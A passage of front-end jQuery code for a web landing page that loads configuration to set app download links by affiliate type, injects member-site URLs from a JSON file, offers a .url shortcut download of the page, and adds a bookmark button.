  dlbtn.download = name;
}

function apiPublicConfigs() {
  $.ajax({
    type: "GET",
    url: `/web/rest/publicConfigs`,
    error: function (error) {
      console.error(error);
    },
  }).done(function (data) {
    const result = data.result;
    const siteType =
        result["config.affKey"] !== "1"
            ? "official"
            : result["config.aff"] === "2"
                ? "ydl"
                : result["config.aff"] === "1"
                    ? "wdl"
                    : "";

    const appDownloadLink =
        siteType === "official"
            ? result["app.download.member"]
            : siteType === "ydl"
                ? result["app.download.agent.activity"]
                : siteType === "wdl"
                    ? result["app.download.agent.noactivity"]
                    : "";

    if (result) {
      $('body').addClass(siteType);
    }

    if (result && appDownloadLink) {
      $("[data-app]").prop("href", appDownloadLink);
    }
  });
}

$(document).ready(function () {
  $(".online_service1")
    .mouseover(function () {
      $(".id_code").show();
    })
    .mouseout(function () {
      $(".id_code").hide();
    });

  var content = "[InternetShortcut]\n" + "URL=" + location.href + "\n";
  var title = document.title + ".url";
  create(content, title, "text/plain");

  /**
   * Get publicConfigs API
   */
  apiPublicConfigs();

  /**
   * Inject url into dom
   */
  $.getJSON("./url.json", function (data) {
    const dhwAppUrl = data.dhwapp;
    if (dhwAppUrl) {
      $("[data-dhwapp]").prop("href", dhwAppUrl);
    }

    const urlArr = data.membersite;
    $("[data-url]").each(function (index, value) {
      $(value).attr("href", urlArr[index]);
    });
    $.test();
  });

  /**
   * Bookmark button
   */
  $("#bookmarkme").on("click", function () {
    if (window.sidebar && window.sidebar.addPanel) {
      // Mozilla Firefox Bookmark
      window.sidebar.addPanel(document.title, window.location.href, "");
    } else if (window.external && "AddFavorite" in window.external) {
      // IE Favorite
      window.external.AddFavorite(location.href, document.title);
    } else if (window.opera && window.print) {
      // Opera Hotlist
      this.title = document.title;
      return true;
    } else {
      // webkit - safari/chrome
      alert(
        "Press " +
          (navigator.userAgent.toLowerCase().indexOf("mac") != -1
            ? "按Ctrl / Cmd "
            : "CTRL") +
          "+ D将此页加入书签。"
      );
    }
  });
});
